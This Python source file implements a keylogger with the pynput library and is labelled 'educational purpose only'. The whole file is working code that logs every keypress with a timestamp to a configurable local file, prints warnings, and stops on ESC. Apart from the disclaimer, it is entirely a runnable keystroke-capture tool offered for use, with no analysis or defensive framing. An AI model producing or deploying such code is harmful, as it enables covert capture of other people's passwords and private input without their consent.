"""
Simple Keylogger - Educational Purpose Only
============================================
WARNING: This tool is for EDUCATIONAL PURPOSES ONLY.
Unauthorized use of keyloggers is ILLEGAL and UNETHICAL.
Only use this on systems you own or have explicit written permission to test.
"""

import pynput
from pynput import keyboard
from datetime import datetime
import os
import argparse

# Configuration
# Default log file location (can be overridden via command-line argument)
DEFAULT_LOG_FILE = "keystrokes.log"
TIMESTAMP_FORMAT = "%Y-%m-%d %H:%M:%S"

# Global variable to store log file path
LOG_FILE = None


def on_press(key):
    """
    Callback function that is called when a key is pressed.
    Logs the keypress to a file with timestamp.
    """
    try:
        # Get current timestamp
        timestamp = datetime.now().strftime(TIMESTAMP_FORMAT)
        
        # Handle special keys
        if key == keyboard.Key.space:
            log_entry = f"[{timestamp}] SPACE\n"
        elif key == keyboard.Key.enter:
            log_entry = f"[{timestamp}] ENTER\n"
        elif key == keyboard.Key.tab:
            log_entry = f"[{timestamp}] TAB\n"
        elif key == keyboard.Key.backspace:
            log_entry = f"[{timestamp}] BACKSPACE\n"
        elif key == keyboard.Key.shift:
            log_entry = f"[{timestamp}] SHIFT\n"
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            log_entry = f"[{timestamp}] CTRL\n"
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            log_entry = f"[{timestamp}] ALT\n"
        elif key == keyboard.Key.esc:
            log_entry = f"[{timestamp}] ESC\n"
        elif hasattr(key, 'char') and key.char is not None:
            # Regular character key
            log_entry = f"[{timestamp}] {key.char}\n"
        else:
            # Other special keys
            log_entry = f"[{timestamp}] {str(key)}\n"
        
        # Write to log file
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(log_entry)
            
    except Exception as e:
        print(f"Error logging keypress: {e}")


def on_release(key):
    """
    Callback function that is called when a key is released.
    Stops the keylogger if ESC key is pressed.
    """
    # Stop keylogger when ESC is pressed
    if key == keyboard.Key.esc:
        print("\n[!] Keylogger stopped by user (ESC pressed)")
        print(f"[!] Log file saved to: {os.path.abspath(LOG_FILE)}")
        return False


def setup_log_file(log_path):
    """
    Sets up the log file path and creates directory if needed.
    
    Args:
        log_path: Path to the log file (can be relative or absolute)
    
    Returns:
        str: Absolute path to the log file
    """
    # Convert to absolute path
    abs_path = os.path.abspath(log_path)
    
    # Get directory path
    log_dir = os.path.dirname(abs_path)
    
    # Create directory if it doesn't exist
    if log_dir and not os.path.exists(log_dir):
        try:
            os.makedirs(log_dir, exist_ok=True)
            print(f"[*] Created directory: {log_dir}")
        except Exception as e:
            print(f"[!] Warning: Could not create directory {log_dir}: {e}")
            # Fall back to current directory
            abs_path = os.path.abspath(os.path.basename(log_path))
    
    return abs_path


def start_keylogger(log_file_path):
    """
    Starts the keylogger and begins monitoring keyboard input.
    
    Args:
        log_file_path: Path to the log file
    """
    global LOG_FILE
    LOG_FILE = log_file_path
    
    print("=" * 60)
    print("SIMPLE KEYLOGGER - EDUCATIONAL PURPOSE ONLY")
    print("=" * 60)
    print("\n[!] WARNING: Only use this on systems you own!")
    print("[!] Press ESC to stop the keylogger\n")
    print(f"[*] Logging keystrokes to: {LOG_FILE}")
    print(f"[*] Full path: {os.path.abspath(LOG_FILE)}")
    print("[*] Keylogger is now active...\n")
    
    # Clear or create log file
    with open(LOG_FILE, 'w', encoding='utf-8') as f:
        f.write(f"Keylogger started at: {datetime.now().strftime(TIMESTAMP_FORMAT)}\n")
        f.write("=" * 60 + "\n\n")
    
    # Create listener
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    # Set up command-line argument parser
    parser = argparse.ArgumentParser(
        description="Simple Keylogger - Educational Purpose Only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  py keylogger.py                               # Use default location (Windows)
  python keylogger.py                           # Use default location (Linux/Mac)
  py keylogger.py -o logs/my_log.txt            # Custom file in logs directory (Windows)
  py keylogger.py --output C:\\logs\\keys.log    # Absolute path (Windows)
  python keylogger.py -o /home/user/logs/keys.log # Absolute path (Linux/Mac)
        """
    )
    
    parser.add_argument(
        '-o', '--output',
        type=str,
        default=DEFAULT_LOG_FILE,
        help=f'Path to the log file (default: {DEFAULT_LOG_FILE})'
    )
    
    args = parser.parse_args()
    
    # Set up log file path
    log_file_path = setup_log_file(args.output)
    
    try:
        start_keylogger(log_file_path)
    except KeyboardInterrupt:
        print("\n[!] Keylogger interrupted by user")
        if LOG_FILE:
            print(f"[!] Log file saved to: {os.path.abspath(LOG_FILE)}")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        print("[!] Make sure you have installed the required dependencies:")
        print("    pip install pynput")

